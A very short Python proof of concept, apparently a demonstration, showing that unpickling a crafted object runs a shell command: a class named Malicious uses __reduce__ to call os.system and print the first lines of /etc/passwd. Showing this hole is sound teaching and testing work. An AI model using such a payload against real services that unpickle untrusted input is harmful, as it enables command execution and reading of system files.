import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ('head -n 30 /etc/passwd',))

if __name__ == '__main__':
    malicious_pickle = pickle.dumps(Malicious())
    pickle.loads(malicious_pickle)
    print("Vulnerable code executed!")
